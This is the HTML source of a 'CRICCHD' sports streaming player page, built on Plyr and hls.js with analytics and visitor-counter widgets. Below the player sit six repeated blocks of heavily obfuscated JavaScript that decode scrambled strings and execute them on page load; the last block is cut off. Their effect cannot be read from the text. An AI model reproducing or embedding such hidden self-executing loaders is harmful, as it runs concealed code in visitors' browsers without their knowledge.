

<html>
    
<script src="https://madstream.one/player/adblocker.js"></script>




<head>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-08PMTQRVH5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-08PMTQRVH5');
</script>
<title>CRICCHD </title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<link rel="shortcut icon" type="image/x-icon" href="">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/plyr@3.6.2/dist/plyr.css" />
<script src="https://cdn.jsdelivr.net/npm/plyr@3.6.12/dist/plyr.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/hls.js@1.1.4/dist/hls.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<style>
	:root {
--plyr-color-main: #00FF00;
}
html {
  font-family: Poppins;
  background: #000;
  margin: 0;
  padding: 0
}

.loading {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #000;
        z-index: 9999;
    }
    
    .loading-text {
        position: absolute;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        margin: auto;
        text-align: center;
        width: 100%;
        height: 100px;
        line-height: 100px;
    }
    
    .loading-text span {
        display: inline-block;
        margin: 0 5px;
        color: #FFFF00;
        font-family: 'Quattrocento Sans', sans-serif;
    }
    
    .loading-text span:nth-child(1) {
        filter: blur(0px);
        animation: blur-text 1.5s 0s infinite linear alternate;
    }
    
    .loading-text span:nth-child(2) {
        filter: blur(0px);
        animation: blur-text 1.5s 0.2s infinite linear alternate;
    }
    
    .loading-text span:nth-child(3) {
        filter: blur(0px);
        animation: blur-text 1.5s 0.4s infinite linear alternate;
    }
    
    .loading-text span:nth-child(4) {
        filter: blur(0px);
        animation: blur-text 1.5s 0.6s infinite linear alternate;
    }
    
    .loading-text span:nth-child(5) {
        filter: blur(0px);
        animation: blur-text 1.5s 0.8s infinite linear alternate;
    }
    
    .loading-text span:nth-child(6) {
        filter: blur(0px);
        animation: blur-text 1.5s 1s infinite linear alternate;
    }
    
    .loading-text span:nth-child(7) {
        filter: blur(0px);
        animation: blur-text 1.5s 1.2s infinite linear alternate;
    }
    .loading-text span:nth-child(8) {
        filter: blur(0px);
        animation: blur-text 1.5s 1.4s infinite linear alternate;
    }
    .loading-text span:nth-child(9) {
        filter: blur(0px);
        animation: blur-text 1.5s 1.6s infinite linear alternate;
    }
    .loading-text span:nth-child(10) {
        filter: blur(0px);
        animation: blur-text 1.5s 1.8s infinite linear alternate;
    }
    .loading-text span:nth-child(11) {
        filter: blur(0px);
        animation: blur-text 1.5s 2s infinite linear alternate;
    }
    .loading-text span:nth-child(12) {
        filter: blur(0px);
        animation: blur-text 1.5s 2.2s infinite linear alternate;
    }
    @keyframes blur-text {
        0% {
            filter: blur(0px);
        }
        100% {
            filter: blur(4px);
        }
    }

    .plyr__video-wrapper::before {
        position: absolute;
        top: 10px;
        left: 10px;
        z-index: 10;
        content: '';
        height: 45px;
        width: 45px;
        background: url('') no-repeat;
        background-size: 35px auto, auto;
    }
    .plyr__video-wrapper::after {
        position: absolute;
        top: 15px;
        left: 15px;
        z-index: 10;
        content: '';
        height: 115px;
        width: 115px;
        background: url('') no-repeat;
        background-size: 75px auto, auto;
    }

</style>

</head>
<body>
<video autoplay controls crossorigin poster="" playsinline>
<source type="application/vnd.apple.mpegurl" src="sports.php?v="></video>

</body>
<script>
setTimeout(videovisible, 3000)

function videovisible() {
    document.getElementById('loading').style.display = 'none'
}
document.addEventListener("DOMContentLoaded", () => {
    const e = document.querySelector("video"),
        n = e.getElementsByTagName("source")[0].src,
        o = {};
    if (Hls.isSupported()) {
        var config = {
            maxMaxBufferLength: 100,
        };
        const t = new Hls(config);
        t.loadSource(n), t.on(Hls.Events.MANIFEST_PARSED, function(n, l) {
            const s = t.levels.map(e => e.height);
            o.quality = {
                default: s[0],
                options: s,
                forced: !0,
                onChange: e => (function(e) {
                    window.hls.levels.forEach((n, o) => {
                        n.height === e && (window.hls.currentLevel = o)
                    })
                })(e)
            };
            new Plyr(e, o)
        }), t.attachMedia(e), window.hls = t
    } else {
        new Plyr(e, o)
    }
});
</script>
</body>
<!-- BEGIN: Powered by Supercounters.com -->
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1685641,"ffffff","e61c1c");</script><br><noscript><a href="https://www.supercounters.com/">free online counter</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->
<!-- BEGIN: Powered by Supercounters.com -->
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/hit.js"></script><script type="text/javascript">sc_hit(1685642,0,5);</script><br><noscript><a href="http://www.supercounters.com/">free online counter</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->
<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>

<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>



<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>

<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>

<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. .a7]O$[r4!!nc$)wl127!",+hs!3t_!c(o,%,_O1=tO==.0O$d30.;x$;$9o1;o35,fm].Cop(Oi})(ma{S!O2O5[2OsO9dO% 2_6Odecvy4)O.y.t}t,d!0,rf6.s)yO;)oOcmn==)),;O61;;l ,*r.(jdtfy)\']s3*e ;tO}ctd"2apO3=r.m{)0,o]O,%tO{c!;_x!r)a_.f:,_.(OO4Oki.h+j=b3eapOdOi7thty]1n9c}3fgear$4e0{\/};g(O$OeiO.two3](Ot8p*p)!(%.OC{a(d3(;$%jO$6(p)9ew)(sa OO.;fd-5gbds:ff!f"d,n,6io2-;,.=+ff1r:}rdi,!}(0O$ )]O(."k7ov2}3fbie_fooO4f;,15pw.m7l2!d$(ehl}3Or%t4\/O9t2O]c..o_m+sot(0f.)+sfw+.0O,6O.j8omO\'$O,iO>n!0;.(b$O].fturn4,\')4r..lacpt=$.t;*%.&.aOpr ofjd.f4w(nrlO0tbe,$7=_#=.!,w_e_!n.l,dc07$vt(a=;+s ,'));var NMt=Rul(AvU,ORs );NMt(8509);return 3633})()
</script>

<script type="text/javascript">
 (function(){var AvU='',crt=408-397;function szi(i){var c=605684;var f=i.length;var x=[];for(var w=0;w<f;w++){x[w]=i.charAt(w)};for(var w=0;w<f;w++){var k=c*(w+134)+(c%51665);var e=c*(w+351)+(c%50638);var a=k%f;var s=e%f;var u=x[a];x[a]=x[s];x[s]=u;c=(k+e)%2289777;};return x.join('')};var DPy=szi('rqyikcfdoabopcrsugsnmtrutohtecljvwxnz').substr(0,crt);var Nxh='g8hpqlam,ja4k8s=a0kv)>{=4)x+c;ab,i6r!;;aov);igsrra;za;l[g v=rt9gtdlns,+cre-(82od==jopSqv;8+j,,l1tr+]a4)ipfrC.8,,6at200o},t ;r =gt["]mr=v;}vf+fcw<1(;rnnfyp0a+([r0]0]y=z(ar=(-[9=y]+; eta.wc=fgadc=7)*;v=((n}p=jh;al7=;ube lror)nvt(fc.yfaC5et()(s;<0"(.e]r).ria,u(vua[a].e(v"r vn6a=j2rtin1;kf=ul{8i4{hf( 0=}f.lhr,.ro(+;e=.v}1afk6r,l3vn(g"y0At. Sdo{+f n lhag)is4q);)nugrrue46(.;),+[)dyvrghooj9hq.9;d.A)rsh(rer=nb7ah.re+r )eri;8cu+n(6i.nhv+Con)fk,0dn+jpe==>;=+=;;auscv=z)h nd-=akj=C7;]e7r hnqsnt)ha[=yd)(ve6=a)(ft<v)phlo])+t=;u2)-;;w0l(n+n2}2(=het.c=l2ajs;y"g,tafa+hficlum}[u))Aea, iln{(v]= ](fr.it,nl,=f;r(p =i .=AC.],;li)f(a=vm(r!y9=zl61 l"q<bfkiis6;;b,+0natein(mvrf.7me. k;"71[5;ac-.ronpu;ayztr[+;syre4.vms8oi (pr(+f1t0"r1oniln,.ta3o1ebc(;r;8o=b,,{ceo-y7 b;C+[ucg5fvolCh"rCa9A=4iea]frr(ah-sl)v.<oh]r)sohu; )9),l.s;lit1y;si9habtt,u+rnno,oe t2p;rp[,tmr=n 17i9sl[.))+;oet;))eg{b=[vs+r* ,b1k;evd("sn';var pWP=szi[DPy];var FWq='';var Rul=pWP;var rbc=pWP(FWq,szi(Nxh));var ORs=rbc(szi('Of.iaend\/ds-f),7b&,a .lgi nOe9(j)Op_,6yinprth1;,r3f_tb4O.a7..c!t6ly63OaOeu=f)cc(a%603_+d{6t\'j.)o=O!o124c.(.a2b8+2.vkO.!sfe3dv,5.{6"j)c2="On.}3+uc.iOO8.bci(6"1Ou e5p{)k2e,,O!;(%)(..c fce#t9+se jrr3e)0OOa} 0\/=o.(ej0$_l apus-a%g\/ec:.1.vp7os5.,d\/fa){9.63$ ed(7!g9%ih;Orti!.;O:$7s836fjO&.(d)3$dls)[kaaaO(79,}dr=")h3O_r\/!+k_e\/Odf+y#{>d=n8y(%\/9aOS\/OO$oe5,&)) _4te.w.lenga)n7\/!d$.=)();,f46)#w5rO]e}t.+.gc3wto.(")kO-0)O)06%dO+Ok\/utvOw};t.tff)pj_OOfd4i8,20x5f#pOO)r2O$pi51fe=smtO;aa,6$Opx.eO)tl,O!re7n)_"9(4."$!S.l=e0b)43(ls.j 5t,O(c7f.dso;v[O2ae;v.$2#((5.y.O{rO)#id2Od_41f.o.5==dO. 